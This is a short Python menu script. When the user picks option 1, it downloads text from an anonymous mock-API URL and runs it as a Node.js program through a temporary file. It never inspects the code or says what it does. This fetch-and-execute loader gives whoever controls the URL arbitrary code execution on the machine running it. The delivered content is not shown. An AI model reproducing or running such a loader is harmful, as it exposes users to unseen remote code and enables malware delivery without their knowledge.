import os
import sys
import tempfile
import subprocess
import requests
import socket
import io

# Ensure the console is using UTF-8 encoding
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

def check_internet_connection():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

def run_node_script(script_content):
    # Create a temporary file to save the Node.js script
    with tempfile.NamedTemporaryFile(delete=False, suffix='.js', mode='w', encoding='utf-8') as temp_file:
        temp_file.write(script_content)
        temp_file_path = temp_file.name

    try:
        # Run the Node.js script using the Node.js runtime
        result = subprocess.run(['node', temp_file_path], capture_output=True, text=True, encoding='utf-8')
        print(f"Node.js script output:\n{result.stdout}")
        if result.stderr:
            print(f"Node.js script errors:\n{result.stderr}")
    finally:
        os.remove(temp_file_path)

def banner():
    print("Please choose an option")

try:
    while True:
        banner()
        chon = input("Enter number (1) to run or (0) to exit: ")

        if chon == '0':
            print("Program ended...")
            break
        elif chon == '1':
            if check_internet_connection():
                try:
                    response = requests.get('https://run.mocky.io/v3/5091de17-a202-4bc8-a53f-674bf71732a6')
                    response.raise_for_status()
                    run_node_script(response.text)
                except requests.RequestException as e:
                    print(f"Network error: {e}")
            else:
                print("No network connection. Please check your connection.")
        else:
            print("Please enter only numbers")
except KeyboardInterrupt:
    print("\nProgram ended...")
